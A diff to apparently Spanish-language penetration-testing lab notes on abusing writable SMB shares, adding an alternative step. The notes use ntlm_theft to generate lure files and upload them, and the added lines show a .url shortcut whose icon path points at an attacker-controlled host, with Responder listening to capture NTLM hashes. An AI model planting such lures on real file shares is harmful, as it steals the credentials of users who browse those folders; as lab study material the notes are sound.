@@ -50,7 +50,7 @@ mount -t cifs //10.10.10.182/Data /mnt/smbmounted -o username=r.thompson,passwor
 umount /mnt/smbmounted
 ```
 
-## WRITE
+## PERMISOS WRITE 
 
 ```bash
 https://github.com/Greenwolf/ntlm_theft
@@ -61,5 +61,16 @@ python ntlm_theft.py -g all -s 10.10.14.6 -f 0xdf
 prompt off
 
 mput * 
+```
+
+
+- O si no probar
+```bash
+[InternetShortcut]
+URL=http://10.10.14.20/a/share.html
+IconIndex=1
+IconFile=\\10.10.14.20\x\share.ico
+
+#Responder -I tun0 (aun con ligolo)
 ```
 
